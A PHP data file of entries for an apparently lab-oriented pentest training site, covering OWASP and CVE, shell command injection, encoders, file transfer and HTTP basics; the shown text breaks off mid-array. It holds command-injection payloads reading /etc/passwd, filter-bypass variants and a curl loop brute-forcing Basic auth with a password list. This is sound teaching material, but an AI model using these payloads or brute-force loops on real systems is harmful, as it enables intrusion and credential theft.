<?php
$exploits_en=
array (
  'Acteurs-intro' => 
  array (
    'category' => 'Acteurs',
    'id' => 'intro',
    'title' => 'Actors',
    'desc' => '## Actors


',
  ),
  'Acteurs-owasp' => 
  array (
    'category' => 'Acteurs',
    'id' => 'owasp',
    'title' => 'OWASP',
    'desc' => '## OWASP

The Open Web Application Security Project (OWASP) is a community, founded in 2001, which produces and makes available for free articles, methodologies, tools...<br/>
Every year, it publishes the Top 10 Web security vulnerabilities.
It publishes the OWASP Testing Guide: a guide to best practices in depentesting.<br/>
It publishes the OWASP Development Guide: a guide to writing code without security holes.
<a href=\'https://www.owasp.org\'>Official website: https://www.owasp.org</a>

',
  ),
  'Acteurs-mitre' => 
  array (
    'category' => 'Acteurs',
    'id' => 'mitre',
    'title' => 'MITRE Corporation',
    'desc' => '## MITRE Corporation

Mitre is the organization, funded by the United States Defense Department, which has implemented and maintains the CVE referencing (Common Vulnerabilities and Exposures).
<a href=\'https://en.wikipedia.org/wiki/Mitre_Corporation\'>https://en.wikipedia.org/wiki/Mitre_Corporation</a>

',
  ),
  'Acteurs-cve' => 
  array (
    'category' => 'Acteurs',
    'id' => 'cve',
    'title' => 'CVE',
    'desc' => '## CVE

A CVE, for Common Vulnerabilities and Exposures, is a reference for a security flaw.<br/>
<a href=\'https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures\'>https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures</a>


',
  ),
  'cmdinjection-intro' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'intro',
    'title' => 'Shell commands injection',
    'desc' => '## Shell commands injection

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

For example: a form allows to enter its name and display it.
The server-side code will look like: system (\'echo \'.$NAME);
If we enter: YOLO; cat /etc/password;
The server will chain the two commands by executing system (\'echo YOLO; cat /etc/password;\'); and allow us to retrieve the content of the passwd file.
',
  ),
  'cmdinjection-CommandPrinciple' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandPrinciple',
    'title' => 'Command Injection: Principle',
    'desc' => '## Command Injection: Principle

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

Example: You enter your name in a Web Form, your name is sent to the server then used in a shell command.
The server-side code looks like:
```
system (\'echo \'.$NAME);
```

Instead of just entering Yolo, you enter:
```
YOLO; cat /etc/password;
```

The server will chain the two commands by executing:
```
system (\'echo YOLO; cat /etc/password;\');
```

It is then possible to dump the content of the passwd file.

A command injection gives full control over the server.
One can retrieve informations about the server (uname -a), account names (cat /etc/passwd), web server config files, launch a reverse shell...

',
  ),
  'cmdinjection-CommandChainUx' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandChainUx',
    'title' => 'Unix: Chaining shell commands',
    'desc' => '## Unix: Chaining shell commands

Commands separators are : ; && | ||
```
echo YOLO; uname -a; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Only if the first cmd fail
```


',
  ),
  'cmdinjection-CommandEvalUx' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandEvalUx',
    'title' => 'Unix: Force command execution in a string',
    'desc' => '## Unix: Force command execution in a string

To force command execution in a string let use ` $ or {
```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```


',
  ),
  'cmdinjection-CommandSpaceFilteres' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandSpaceFilteres',
    'title' => 'Bypass: Spaces are filtered',
    'desc' => '## Bypass: Spaces are filtered

Developpers sometimes add filters to avoid command injection. For exemple, they could filter Spaces.
Hopefully, even without spaces it\'s still possible to launch shell commands:
```
cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$\'cat\\x20/etc/passwd\'&&$X
```


',
  ),
  'cmdinjection-CommandBlacklist' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandBlacklist',
    'title' => 'Bypass: Some keywords are filtered',
    'desc' => '## Bypass: Some keywords are filtered

A keyword based filter is easy to bypass using simple quote, double quote, backslash and slash
```
c\'a\'t /etc/passwd
cat /etc/passwd
c\\at /etc/passwd
who``ami
```

In case the file \'/etc/passwd\' is filtered, just add /
```
c\\at /etc////////passwd
```



',
  ),
  'Encode-intro' => 
  array (
    'category' => 'Encode',
    'id' => 'intro',
    'title' => 'Encode',
    'desc' => '## Encode


',
  ),
  'Encode-EncodeHex' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeHex',
    'title' => 'Hexadecimal encode/decode',
    'desc' => '## Hexadecimal encode/decode


<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à encoder</label><br/>
<textarea id=\'hexEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexEncode()\' onChange=\'onHexEncode()\'></textarea>
<textarea readonly id=\'hexEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function convertFromHex(hex) {
var hex = hex.toString();//force conversion
var str = \'\';
for (var i = 0; i < hex.length; i += 2)
str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
return str;
}
function convertToHex(str) {
var hex = \'\';
for(var i=0;i<str.length;i++) {
hex += \'\'+str.charCodeAt(i).toString(16);
}
return hex;
}
function onHexEncode(){
document.getElementById(\'hexEncodeOut\').value = convertToHex(document.getElementById(\'hexEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à décoder</label>
<textarea id=\'hexDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexDecode()\' onChange=\'onHexDecode()\'></textarea>
<textarea readonly id=\'hexDecodeOut\' rows = \'5\' class=\'col-5\'  name = \'description\'></textarea>
</div>
<script>
function onHexDecode(){
document.getElementById(\'hexDecodeOut\').value = convertFromHex(document.getElementById(\'hexDecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-HTTPBase64' => 
  array (
    'category' => 'Encode',
    'id' => 'HTTPBase64',
    'title' => 'Base64 encode/decode',
    'desc' => '## Base64 encode/decode

Base64 encoding is used to transmit data using only displayable characters (letters, numbers, a few signs, etc.)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'base64EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Encode()\' onChange=\'onBase64Encode()\'></textarea>
<textarea readonly id=\'base64EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onBase64Encode(){
document.getElementById(\'base64EncodeOut\').value = window.btoa(document.getElementById(\'base64EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'base64DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Decode()\' onChange=\'onBase64Decode()\'></textarea>
<textarea readonly id=\'base64DecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onBase64Decode(){
document.getElementById(\'base64DecodeOut\').value = window.atob(document.getElementById(\'base64DecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeURL' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeURL',
    'title' => 'URL/Percent encode/decode',
    'desc' => '## URL/Percent encode/decode

URL/Percent encoding is used to transmit special characters in URL such as quote, spaces...)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'UrlEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlEncode()\' onChange=\'onUrlEncode()\'></textarea>
<textarea readonly id=\'UrlEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onUrlEncode(){
document.getElementById(\'UrlEncodeOut\').value = encodeURIComponent(document.getElementById(\'UrlEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'UrlDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlDecode()\' onChange=\'onUrlDecode()\'></textarea>
<textarea readonly id=\'UrlDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onUrlDecode(){
document.getElementById(\'UrlDecodeOut\').value = decodeURIComponent(document.getElementById(\'UrlDecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeROT13' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeROT13',
    'title' => 'ROT13 encode/decode',
    'desc' => '## ROT13 encode/decode

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'Rot13EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Encode()\' onChange=\'onRot13Encode()\'></textarea>
<textarea readonly id=\'Rot13EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function rot13(str) {
var input     = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\';
var output    = \'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\';
var index     = x => input.indexOf(x);
var translate = x => index(x) > -1 ? output[index(x)] : x;
return str.split(\'\').map(translate).join(\'\');
}
function onRot13Encode(){
document.getElementById(\'Rot13EncodeOut\').value = rot13(document.getElementById(\'Rot13EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'Rot13DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Decode()\' onChange=\'onRot13Decode()\'></textarea>
<textarea readonly id=\'Rot13DecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onRot13Decode(){
document.getElementById(\'Rot13DecodeOut\').value = rot13(document.getElementById(\'Rot13DecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeCaesar' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeCaesar',
    'title' => 'Caesar encode/decode',
    'desc' => '## Caesar encode/decode

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Shift</label>
<textarea id=\'CaesarShift\' rows = \'1\' class=\'col-1\' name = \'description\' onKeyUp=\'onCaesarEncode();onCaesarDecode();\' onChange=\'onCaesarEncode();onCaesarDecode();\'></textarea>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'CaesarEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarEncode()\' onChange=\'onCaesarEncode()\'></textarea>
<textarea readonly id=\'CaesarEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
var alphabet = \'abcdefghijklmnopqrstuvwxyz\';
var fullAlphabet = alphabet + alphabet + alphabet;

function CaesarEncode(cipherText, cipherOffset){
cipherOffset = (cipherOffset % alphabet.length);
var cipherFinish = \'\';

for(i=0; i<cipherText.length; i++){
var letter = cipherText[i];
var upper = (letter == letter.toUpperCase());
letter = letter.toLowerCase();

var index = alphabet.indexOf(letter);
if(index == -1){
cipherFinish += letter;
} else {
index = ((index + cipherOffset) + alphabet.length);
var nextLetter = fullAlphabet[index];
if(upper) nextLetter = nextLetter.toUpperCase();
cipherFinish += nextLetter;
}
}

return cipherFinish;
}

function onCaesarEncode(){
document.getElementById(\'CaesarEncodeOut\').value = CaesarEncode(document.getElementById(\'CaesarEncodeIn\').value, document.getElementById(\'CaesarShift\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'CaesarDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarDecode()\' onChange=\'onCaesarDecode()\'></textarea>
<textarea readonly id=\'CaesarDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onCaesarDecode(){
document.getElementById(\'CaesarDecodeOut\').value = CaesarEncode(document.getElementById(\'CaesarDecodeIn\').value, - document.getElementById(\'CaesarShift\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeMorse' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeMorse',
    'title' => 'Morse Code',
    'desc' => '## Morse Code

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'MorseEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseEncode()\' onChange=\'onMorseEncode()\'></textarea>
<textarea readonly id=\'MorseEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
var alphabet_morse = {
\'a\': \'.-\',    \'b\': \'-...\',  \'c\': \'-.-.\', \'d\': \'-..\',
\'e\': \'.\',     \'f\': \'..-.\',  \'g\': \'--.\',  \'h\': \'....\',
\'i\': \'..\',    \'j\': \'.---\',  \'k\': \'-.-\',  \'l\': \'.-..\',
\'m\': \'--\',    \'n\': \'-.\',    \'o\': \'---\',  \'p\': \'.--.\',
\'q\': \'--.-\',  \'r\': \'.-.\',   \'s\': \'...\',  \'t\': \'-\',
\'u\': \'..-\',   \'v\': \'...-\',  \'w\': \'.--\',  \'x\': \'-..-\',
\'y\': \'-.--\',  \'z\': \'--..\',
\' \': \'/\',     \'_\': \'..--.-\',
\'1\': \'.----\', \'2\': \'..---\', \'3\': \'...--\', \'4\': \'....-\',
\'5\': \'.....\', \'6\': \'-....\', \'7\': \'--...\', \'8\': \'---..\',
\'9\': \'----.\', \'0\': \'-----\',
};
function stringToMorse(txt) {
var morse = txt.split(\'\')            // Transform the string into an array: [\'T\', \'h\', \'i\', \'s\'...
.map(function(e){     // Replace each character with a morse letter
return alphabet_morse[e.toLowerCase()] || \'\'; // Lowercase only, ignore unknown characters.
})
.join(\' \')            // Convert the array back to a string.
/*.replace(/ +/g, \' \'); // Replace double spaces that may occur when unknow characters were in the source string.*/
return morse;
}
function onMorseEncode(){
document.getElementById(\'MorseEncodeOut\').value = stringToMorse(document.getElementById(\'MorseEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'MorseDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseDecode()\' onChange=\'onMorseDecode()\'></textarea>
<textarea readonly id=\'MorseDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
var MORSE_CODE = {\'.-\': \'a\', \'-...\':\'b\', \'-.-.\': \'c\', \'-..\': \'d\', \'.\':\'e\', \'..-.\':\'f\', \'--.\':\'g\', \'....\':\'h\', \'..\':\'i\', \'.---\':\'j\', \'-.-\':\'k\', \'.-..\':\'l\', \'--\':\'m\', \'-.\':\'n\', \'---\':\'o\', \'.--.\':\'p\', \'--.-\':\'q\', \'.-.\':\'r\', \'...\':\'s\', \'-\':\'t\', \'..-\':\'u\', \'...-\':\'v\', \'.--\':\'w\', \'-..-\':\'x\', \'-.--\':\'y\', \'--..\':\'z\', \'.----\':\'1\', \'..---\':\'2\', \'...--\':\'3\', \'....-\':\'4\', \'.....\':\'5\', \'-....\':\'6\', \'--...\':\'7\', \'---..\':\'8\', \'----.\':\'9\', \'-----\':\'0\', \'|\':\' \', \'..--.-\':\'_\'};

var decodeMorse = function(morseCode){
var words = (morseCode).split(\'  \');
var letters = words.map((w) => w.split(\' \'));
var decoded = [];

for(var i = 0; i < letters.length; i++){
decoded[i] = [];
for(var x = 0; x < letters[i].length; x++){
if(MORSE_CODE[letters[i][x]]){
decoded[i].push( MORSE_CODE[letters[i][x]].toUpperCase() );
}
}
}

return decoded.map(arr => arr.join(\'\')).join(\' \');
}
function onMorseDecode(){
document.getElementById(\'MorseDecodeOut\').value = decodeMorse(document.getElementById(\'MorseDecodeIn\').value);
}
</script>
</div>
<div>
Be careful, capital letters are lost during encoding.
</div>


',
  ),
  'transfert-intro' => 
  array (
    'category' => 'transfert',
    'id' => 'intro',
    'title' => 'File transferts',
    'desc' => '## File transferts


',
  ),
  'transfert-principe' => 
  array (
    'category' => 'transfert',
    'id' => 'principe',
    'title' => 'Principle',
    'desc' => '## Principle

As soon as you get your initial foothold on the target server, your next step is to transfert text or binary files. <br/>
You\'ll probably download some target files and upload some tools such as backdoors or privilege escalation scripts...

',
  ),
  'transfert-base64' => 
  array (
    'category' => 'transfert',
    'id' => 'base64',
    'title' => 'Base64 Copy/Paste',
    'desc' => '## Base64 Copy/Paste

Base64 encoding is the simplest way to upload small binary or text files.
```
cat file | base64
printf \'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\' | base64 -d > file
```

Just prepare the last command on you xterm, it can be many lines long, then copy/paste/exec on you target.

',
  ),
  'transfert-http' => 
  array (
    'category' => 'transfert',
    'id' => 'http',
    'title' => 'File transfert with HTTP Server',
    'desc' => '## File transfert with HTTP Server

To transfer a file without worrying about its size, just launch an HTTP server and make a wget, curl
```
python -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
```

Be carefull, eveyone is able to browse this new server file system.

',
  ),
  'Forensic-intro' => 
  array (
    'category' => 'Forensic',
    'id' => 'intro',
    'title' => 'Forensic',
    'desc' => '## Forensic


',
  ),
  'Forensic-zip' => 
  array (
    'category' => 'Forensic',
    'id' => 'zip',
    'title' => 'Encrypted Zip',
    'desc' => '## Encrypted Zip

Brute force an encrypted zip with a list of passwords
````
fcrackzip -u -v -D -p rockyou.txt secret.zip
````

',
  ),
  'Forensic-mdb' => 
  array (
    'category' => 'Forensic',
    'id' => 'mdb',
    'title' => 'Mdb - Microsoft Access Database',
    'desc' => '## Mdb - Microsoft Access Database

Check file format:
````
$ file backup.mdb
backup.mdb: Microsoft Access Database
````
If needed,install tools:
````
apt-get install mdbtools
````
List tables, then dump.
````
mdb-tables backup.mdb
mdb-export backup.mdp  users passwd
````

',
  ),
  'Forensic-pst' => 
  array (
    'category' => 'Forensic',
    'id' => 'pst',
    'title' => 'Pst - Outlook email file',
    'desc' => '## Pst - Outlook email file

Check file format:
````
$ file mails.pst
mails.pst: Microsoft Outlook email folder
````
If needed,install tools:
````
apt-get install pst-utils
````
Extract mailboxes, then read them.
````
readpst mails.pst
cat mails.mbox
````


',
  ),
  'HackersGuide-intro' => 
  array (
    'category' => 'HackersGuide',
    'id' => 'intro',
    'title' => 'Hacker\'s Guide',
    'desc' => '## Hacker\'s Guide


',
  ),
  'HackersGuide-Guide' => 
  array (
    'category' => 'HackersGuide',
    'id' => 'Guide',
    'title' => 'Intro',
    'desc' => '## Intro
This guide aims to simplify the life of the beginner.
It follows a complete but very simplified methodology. You will thus be able to work on your first servers of easy levels, and pown them without getting lost in the meanders of the Internet.
<br>
<br>


The main phases of a pentest (penetration test) are as follows:

___Definition of the scope___
Clearly define the target, and the limits.
In training, which is our case, these are servers on a local IP address range, not routable on the Internet.
To simplify, you should only work on addresses that start with 10. such as 10.10.0.10.
We never target infrastructures, nor our colleagues.


___Recognition phase___
Gather data and information on your target.
Sources of information can be external sources accessible to all, such as search engines, social networks and DNS (Domain Name Service) or information provided by the client.
Internet databases: Google searches, dns,...

___Mapping phase and enumeration___
Identify servers, open ports and accessible services.
Network knowledge: IP, port, HTTP, ftp, smtp,...
[-> IP](?cat=Network)
[-> Network Discovery](?cat=NetworkDiscovery)
[-> HTTP](?cat=HTTP)

___Vulnerability research___ ___Vulnerability research___ ___Vulnerability research___ ___Vulnerability research
Identify known vulnerabilities by using software and database versions of vulnerable software such as exploit_db, or search for vulnerabilities based on the OWASP Top 10.
Knowledge: CVE, and ideally python, sql,... to understand the exploit and adapt it.
[-> CVE](?id=cve)
[-> Default Password and patterns](?cat=Password)
[-> LFI](?cat=lfi)
[-> Command injection](?cat=cmdinjection)
[-> SQLi](?cat=sqli)


___Exploitation___
Implementation of an exploit so that shell commands can be run on a server.
[-> Webshells](?cat=Webshell)

___Privileges Elevation___
Switch from an account with low privileges, such as a web server, to an administrator account.
Shell knowledge: cd, file system, user rights, config file, sbit, sudo, ...
[-> Shell commands](?cat=Shell)
[-> File transfer](?cat=transfert)
[-> Privilege elevation on Linux](?cat=PrivEscUx)

___Maintaining Access and Cleaning___
Backdoor installation and cleaning of traces to be able to easily reconnect to the server.
This is not beginner stuff.
Knowledge: log systems

___Lateral Move___
Use the server to bounce to other machines that may be located on other internal networks.
This is not beginner stuff.
Knowledge: tunnelling and port forwarding

Have fun !


',
  ),
  'HTTP-intro' => 
  array (
    'category' => 'HTTP',
    'id' => 'intro',
    'title' => 'HTTP',
    'desc' => '## HTTP

A web server is running on the target server.<br/>
<br/>
You enter an URL in your browser to specify the page you want to get.<br/>
Your web browser encodes the URL and sends it to the server using the HTTP protocol.<br/>
The server returns a displayable page described in HTML using the HTTP protocol.<br/>
<br/>
HTTP is a rich protocol, able to negotiate options and exchange data.<br/>
In particular, cookies are used to store information between two sessions.<br/>
HTTP request sand responses can be intercepted, modified and resent thanks to an HTTP proxy.
<br/>
https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol

',
  ),
  'HTTP-HTTP0.9' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTP0.9',
    'title' => 'HTTP 0.9',
    'desc' => '## HTTP 0.9

The HTTP protocol is used by web browsers to obtain documents hosted by servers.<br/>
The browser connects to a server via TCP, on port 80 by default.
The minimal request contains a command (here GET), a URL (/hello.txt), an empty line.
```
GET /hello.txt

```

The answer contains the requested file.
```
Hello world
```


```
$ printf \'GET /hello.txt \\n\\r\\n\' | nc localhost 8001
```


',
  ),
  'HTTP-HTTP1.1' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTP1.1',
    'title' => 'HTTP 1.1',
    'desc' => '## HTTP 1.1

HTTP protocol version 1.1 is optimized for complex HTML pages transferring, and allows negotiation of language and encoding formats.<br/>
The minimal request contains a command (GET), a url (/hello.txt), the version (HTTP/1.1), the Host field, an empty line.<br/>```
GET /hello.txt HTTP/1.1
Host: 10.10.10.11 80

```


The answer contains a header, composed of many fields (server, date,...), the length of the content (here 13), and the content as text.<br/>
```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.15+
Date: Thu, 26 Dec 2019 17:06:12 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 13

Hello world

```


The headers of the answer contains lots of usefull information about the server, its version...<br/>
Here is an Apache server in version 0.8.4 that runs scripts with a php interpreter in version 7.3.13.
```
HTTP/1.1 200 OK
Server: Apache/0.8.4
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.13
```


```
$ printf \'GET / HTTP/1.1\\r\\nHost: localhost 8001\\r\\n\\r\\n\' | nc localhost 8001
```


',
  ),
  'HTTP-HTTPCodes' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPCodes',
    'title' => 'HTTP Codes',
    'desc' => '## HTTP Codes

HTTP response codes
```
1xx informational response – the request was received, continuing process
2xx successful – the request was successfully received, understood, and accepted
200 OK
3xx redirection – further action needs to be taken in order to complete the request
301 Moved Permanently => Redirection
304 Not Modified
4xx client error – the request contains bad syntax or cannot be fulfilled
400 Bad request
401 Unauthorized
403 Forbidden
404 Not found
5xx server error – the server failed to fulfil an apparently valid request
500 Internal Server Error
502 Bad Gateway - The server was acting as a gateway or proxy and received an invalid response from the upstream server
503 Service Unavailable - The server cannot handle the request (because it is overloaded or down for maintenance)
504 Gateway Timeout - The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.
https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
```


',
  ),
  'HTTP-HTTPCurlWget' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPCurlWget',
    'title' => 'Curl and Wget',
    'desc' => '## Curl and Wget

Download a file :
```
$ wget http://localhost:8001/
```

Print the content of the file :
```
$ curl http://localhost:8001/
```

Print the HTTP headers and the content of the file  :
```
$ curl -v http://localhost:8001/
```


',
  ),
  'HTTP-HTTPHeader' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPHeader',
    'title' => 'HTTP Headers',
    'desc' => '## HTTP Headers

HTTP headers are standardized and contain usefull informations.<br/>
- Host: the target of the request.
- Referer: Address of the web page that generated the query.<br/>
- User-Agent: Browser used to log in. <br/>

Custom headers can be freely added. Here \'X-MyHeader: value\':
```
GET / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
X-MyHeader: value

```



Add a custom Header with curl : -H \'header: value\'
```
$ curl -H \'X-MyHeader: yoloforpresident\' http://localhost:8001
```


',
  ),
  'HTTP-HTTPParam' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPParam',
    'title' => 'HTTP Get: parameters',
    'desc' => '## HTTP Get: parameters

An URI (Universal Resource Locator) specify an internet resource, followed by optional parameters.<br/>
The first parameter is identified by a ?, the following ones by a &.<br/>.
If the parameters contain a ? or a &, they are encoded as %3F and %26. This is called Percent (%) encoding.<br/>.https://fr.wikipedia.org/wiki/Percent-encoding<br/>

Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```

As unix shell uses the & to launch background tasks, it is imperative to put the URL between quotes \'.

',
  ),
  'HTTP-HTTPFormAuthSimple' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormAuthSimple',
    'title' => 'HTTP Authentification Basic',
    'desc' => '## HTTP Authentification Basic

HTTP has basic authentication feature, based on a field containing a username and a password in clear text.<br/>
login:password is base64 encoded then added in the request header.<br/>
Authorization: Basic bG9naW46cGFzc3dvcmQ=<br/>
<br/>
Exemple:
```
GET /hello.txt HTTP/1.1
Host: localhost:8001
Authorization: Basic bG9naW46cGFzc3dvcmQ=
User-Agent: curl/7.58.0
Accept: */*

```


Basic auth with curl:
```
$ curl -u login:password http://localhost:8001/hello.txt
```


Base64 encode login:password in shell
```
$ printf \'login:password\' | base64
bG9naW46cGFzc3dvcmQ=
```

Base64 decode
```
$ printf \'bG9naW46cGFzc3dvcmQ=\' | base64 -d
login:password
```


Bruteforce Basic auth with curl and rockyou password list:
```
for i in `cat rockyou.txt`; do printf \\n$i:; curl  -u admin:$i http://12.10.1.11/training-http-auth-simple.php; done
```


',
  ),
  'HTTP-HTTPFormPost' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPost',
    'title' => 'FORM: POST method',
    'desc' => '## FORM: POST method

Web pages send Form fields either using GET method in the URL parameters, or POST method in the request body.<br/>
<br/>
Parameter of GET requests are saved in logs files, and have limited length.<br/>
Parameter of POST requests do not appear in the logs, and are not limited in length. It is thus possible to upload large files.<br/>
These parameters are encoded with \'Percent encoding\'.<br/>
Example:
```
POST /login.php HTTP/1.1
Host: 10.10.1.11
Content-Type: application/x-wwww-form-urlencoded
Content-Length: 24

login=James&password=007
```

Post a form with curl:
```
$ curl -X POST -F \'username=admin\' -F \'password=megapassword\'  http://localhost:8001/
```


',
  ),
  'HTTP-HTTPFormPostHTML' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPostHTML',
    'title' => 'FORM: Identify Form fields in HTML pages',
    'desc' => '## FORM: Identify Form fields in HTML pages

Forms are HTML base objects, enclosed by &lt;form> and &lt;/form> tags.<br/>
&lt;input name=\'xxx\'>: Text input fields<br/>
&lt;form action=\'xxx\': URL to send the Form to. If empty send to the current URL.<br/>
Exemple:
```
&lt;form action=&quot;/action_page.php&quot;&gt;
First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;Mickey&quot;&gt
Last name:  &lt;input type=&quot;text&quot; name=&quot;lastname&quot; value=&quot;Mouse&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
&lt;/form&gt;
```


Post a Form thanks curl:
```
$ curl -X POST -F \'firstname=Mickey\' -F \'lastname=Mouse\'  http://12.10.1.11/action_page.php
```


',
  ),
  'HTTP-HTTPFormGet' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormGet',
    'title' => 'FORM: Get method',
    'desc' => '## FORM: Get method

HTML Forms most often use the POST method, sometime also the GET method is used.<br/>
Paramètres are sent as request URI arguments.<br/>
When using curl in shell, dont forget to use quotes \'<br/>
Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```


',
  ),
  'HTTP-HTTPFormPostJSon' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPostJSon',
    'title' => 'FORM: JSON format',
    'desc' => '## FORM: JSON format

It\'s common to procces form fields values in JavaScript before sending them to the server.<br/>
JavaScript natively makes use of JSon format to exchange structured datas.<br/>
Exemple: {key1:value1, key2:value2}.<br/>
The Content-Type header is then set to json: Content-Type: application/json<br/>

Exemple:
```
POST / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
Content-Type: application/json
Content-Length: 34

{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}
```


Curl:
```
$ curl --header &quot;Content-Type: application/json&quot; -X POST --data  \'{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}\' http://10.10.1.11/
```


',
  ),
  'HTTP-HTTPFormPostFile' => 
  array (
